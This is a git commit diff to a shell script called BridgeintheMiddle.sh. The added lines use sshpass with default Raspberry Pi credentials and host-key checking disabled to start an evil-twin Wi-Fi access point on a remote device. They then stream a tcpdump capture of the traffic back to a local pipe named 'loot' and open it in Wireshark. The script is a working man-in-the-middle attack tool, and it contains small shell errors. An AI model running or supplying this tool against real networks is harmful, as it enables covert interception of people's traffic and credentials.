515b88055945f5c08f47f607f74c8afa19643f71
bmshema <92175742+bmshema@users.noreply.github.com>
2023-06-01 18:14:18 -0500

    Added commands to launch evil twin and tcpdump on remote device

--- BridgeintheMiddle.sh
+++ BridgeintheMiddle.sh
@@ -7,21 +7,32 @@
 ## Bridging Device Variables (CHANGE THESE) ##
 UN = pi
 PW = raspberry
-IP = '10.0.0.12'
+IP = '10.0.0.11'
 
 ## Parameters of your evil twin on your bridging device (CHANGE THESE) ##
 WPA = 2 # Use 1 for WPA, use 2 for WPA2, use 1+2 for both
 CH = 11
-MAC = "11:22:33:44:55:66" # BSSID of your AP
+MAC = '11:22:33:44:55:66' # BSSID of your AP
 FREQ = '2.4' # 2.4 or 5
 INT = wlan0 # Interface to serve AP
 NET = ppp0 # Interface with internet access
 SSID = TestSSID 
 PSK = testtestpsk
 
-
 ## Makes a named pipe for Wireshark to listen to ##
 if [ ! -e /tmp/loot ]; then
     mkfifo /tmp/loot
 fi
 
+# Serves evil twin AP on bridging device ##
+sshpass -p "${PW}" ssh -o StrictHostKeyChecking=no ${UN}@${IP} "sudo create_ap -w ${WPA} -c ${CH} --mac ${MAC} --freq-band ${FREQ} ${INT} ${NET} ${SSID} ${PSK} --no-virt"
+
+sleep 3
+
+## Lanuches tcpdump on bridging device and redirects to local named pipe ##
+sshpass -p "${PW}" ssh -o StrictHostKeyChecking=no ${UN}@${IP} "sudo -S tcpdump -s0 -U -n -w - not port 22" > tmp/loot
+
+sleep 3
+
+# Opens wireshark for you because why not"
+wireshark -k -i /tmp/loot
